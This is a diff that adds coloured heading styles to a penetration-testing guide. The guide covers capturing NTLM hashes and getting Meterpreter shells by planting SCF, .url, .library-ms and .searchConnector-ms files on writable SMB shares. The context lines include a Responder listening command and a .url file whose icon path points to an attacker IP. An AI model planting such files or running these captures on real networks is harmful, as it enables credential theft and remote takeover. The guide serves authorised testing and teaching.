@@ -2,11 +2,11 @@
 
 SMB is a protocol which is widely used across organisations for file sharing purposes. It is not uncommon during internal penetration tests to discover a file share which contains sensitive information such as plain-text passwords and database connection strings. However even if a file share doesn’t contain any data that could be used to connect to other systems but it is configured with write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users or Meterpreter shells.
 
-## Gathering Hashes
+## <mark style="color:red;">Gathering Hashes</mark>
 
 It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.
 
-### SCF Files
+### <mark style="color:orange;">SCF Files</mark>
 
 Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
 
@@ -20,7 +20,7 @@ Command=ToggleDesktop
 
 Saving the file as SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the file.scf on the top of the share drive.
 
-### **URL Files**
+### <mark style="color:orange;">**URL Files**</mark>
 
 This attack also works with `.url` files and `responder -I eth0 -v`.
 
@@ -32,7 +32,7 @@ IconFile=\\10.10.10.10\%USERNAME%.icon
 IconIndex=1
 ```
 
-### **Windows Library Files**
+### <mark style="color:orange;">**Windows Library Files**</mark>
 
 Windows Library Files (.library-ms)
 
@@ -58,7 +58,7 @@ Windows Library Files (.library-ms)
 </libraryDescription>
 ```
 
-### **Windows Search Connectors Files**
+### <mark style="color:orange;">**Windows Search Connectors Files**</mark>
 
 Windows Search Connectors (.searchConnector-ms)
 
@@ -105,7 +105,7 @@ As previously when the user will browse the same share his password hash will be
 
 If the password policy inside the company is sufficient it will take possibly days or weeks for the attacker to crack the captured hash.
 
-## Meterpreter Shells
+## <mark style="color:red;">Meterpreter Shells</mark>
 
 The main advantage of the technique above it that it doesn’t require any user interaction and automatically enforces the user to connect to a share the doesn’t exist negotiating his NTLMv2 hash. Therefore it is also possible to combine this technique with SMB relay that will serve a payload in order to retrieve a Meterpreter shell from every user that will access the share.
 
@@ -133,7 +133,7 @@ When the user will browse the share the SMB server will receive the connection a
 
 A Meterpreter session will received. However in order to avoid losing the connection it is necessary to migrate to a more stable process.
 
-## Automation
+## <mark style="color:red;">Automation</mark>
 
 Theses attacks can be automated with [Farmer.exe](https://github.com/mdsecactivebreach/Farmer) and [Crop.exe](https://github.com/mdsecactivebreach/Farmer/tree/main/crop)
 
